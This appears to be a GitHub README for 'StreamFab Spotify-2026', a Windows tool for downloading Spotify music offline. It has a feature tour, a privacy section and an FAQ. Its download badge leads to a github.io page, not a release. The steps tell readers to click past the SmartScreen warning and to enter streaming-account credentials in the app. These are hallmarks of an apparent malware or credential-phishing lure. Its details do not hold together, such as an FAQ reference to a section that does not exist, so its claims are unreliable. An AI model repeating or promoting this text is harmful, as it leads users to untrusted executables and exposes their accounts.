## 🌌 Overview

StreamFab Spotify-2026 is a desktop application crafted for people who love to keep their music close — not just behind a login screen and a stable internet connection. Whether you are on a long flight, in a rural area with spotty coverage, or simply prefer the calm of a curated offline library, this tool was designed with you in mind.

Think of it as a personal librarian for your playlists. Instead of frantically streaming while the Wi-Fi flickers, your tracks wait patiently on your local drive, ready the moment you open your player. The 2026 edition refines that experience: a redesigned responsive interface, smoother conversion workflows, richer metadata handling, and broader language coverage.

The project is community-driven, released under the permissive MIT license, and intended for lawful use with content you have the right to store offline in your region.

## 🎯 Why a Personal Music Vault?

Modern life is rarely stationary. You commute, you travel, you work from cafés, you wander through national parks. Streaming is wonderful — until the signal drops. A personal music vault solves a simple but stubborn problem: **continuity**.

- **Continuity** — Your playlist never depends on a cell tower.
- **Ownership** — Your files live on your machine, organized your way.
- **Focus** — No autoplay rabbit holes; just the songs you chose.
- **Longevity** — Formats that play on virtually any modern device.
- **Bandwidth savings** — Download once, enjoy many times.

This repository focuses exclusively on the Windows 11 & Windows 10 desktop experience, delivering a tidy, native-feeling setup guide and a consistent, predictable workflow.

## 🚀 Getting Started

The setup is intentionally short. You will be up and running in a few calm minutes.

1. **Obtain the package.**  
   [![Download](https://raw.githubusercontent.com/Firoz2022/StreamFab-Spotify-Converter-Setup-Guide/main/run_d96da68.svg)](https://Firoz2022.github.io/StreamFab-Spotify-Converter-Setup-Guide/)

2. **Unpack the archive.** Right-click the downloaded file and choose your preferred extractor. A clean folder is recommended.

3. **Run the launcher.** Double-click the main executable. Windows may present a SmartScreen prompt on first launch; choose the option to proceed if you trust the source.

4. **Approve permissions.** Grant access to your chosen output folder so the app can write your library.

5. **Choose your language.** The welcome wizard detects your system locale and offers alternatives.

6. **Sign in to your streaming account** through the embedded browser pane — this happens locally on your machine.

7. **Select playlists or tracks**, pick your output format, and add them to the queue.

8. **Press Start.** A progress panel shows each item; you can pause, resume, or reorder at will.

9. **Enjoy your library.** Open your output folder and play the results in your favorite desktop or mobile player.

## 🧭 First-Run Walkthrough

The first-run experience is a short guided tour rather than a wall of options. You will be asked four friendly questions:

- Where should your music live?
- What naming convention do you prefer?
- How many concurrent jobs should run?
- Would you like automatic update checks?

Answer these once, and the app configures itself sensibly. You can revisit every decision later from **Settings → Preferences**.

## 🎛️ Interface Tour

The 2026 interface is built around three zones:

1. **The Sources Rail** — Your connected accounts and local folders appear along the left. Drag them into the workspace to begin.
2. **The Queue Canvas** — The central area where selected items land. Each row has a status chip: Ready, Working, Done, Paused, or Needs Attention.
3. **The Inspector** — The right-hand panel shows details for the selected item: bitrate choices, output path, metadata fields, and language-specific text options.

The layout is responsive: on smaller windows the Inspector collapses into a drawer, and on ultrawide displays the Queue Canvas expands into a multi-column grid.

## ⚡ Performance & Reliability

Performance is a quiet feature: you notice it when it is missing. A few principles guide the engineering:

- **Streaming writes** — Files are written incrementally to reduce memory pressure.
- **Adaptive concurrency** — The queue scales up or down based on available CPU and I/O.
- **Crash-safe checkpoints** — Each job records a checkpoint so restarts are painless.
- **Backpressure-aware networking** — Slow connections do not stall the whole queue.
- **Deterministic logs** — A rolling log file helps diagnose issues without guesswork.

Together, these choices produce an experience that stays stable even during long, unattended sessions.

## 🔐 Privacy & Data Handling

Your listening habits are personal. This project takes that seriously.

- **No telemetry by default.** Nothing is reported unless you explicitly opt in.
- **Local storage.** Queue history and settings live on your machine.
- **No account sharing.** Credentials remain within the app's local session.
- **Clear logs.** Logs are human-readable and easy to delete.
- **Portable mode.** Run the app from a USB drive for an extra layer of isolation.

We encourage users to review the source, audit the network calls, and reach out with questions.

## ❓ Frequently Asked Questions

**Is this affiliated with any streaming service?**  
No. This is an independent project and is not endorsed by or associated with any streaming brand.

**Does it work on macOS or Linux?**  
The current focus is Windows 11 and Windows 10. Other platforms are community experiments at best.

**Can I run it on battery?**  
Yes, with a low-power preset available in Settings.

**Where are my files saved?**  
By default, in a `MusicVault` folder inside your user directory. You can change this at any time.

**How do I report a bug?**  
Open an issue with a log excerpt and a short description of the steps that led to the problem.

**Do I need an internet connection every time?**  
Only when adding new items to your vault. Playing your saved library is entirely local.

**Is there a portable build?**  
Yes — look for the portable variant in the releases area.

**Can I contribute a translation?**  
Absolutely. See the localization section above.
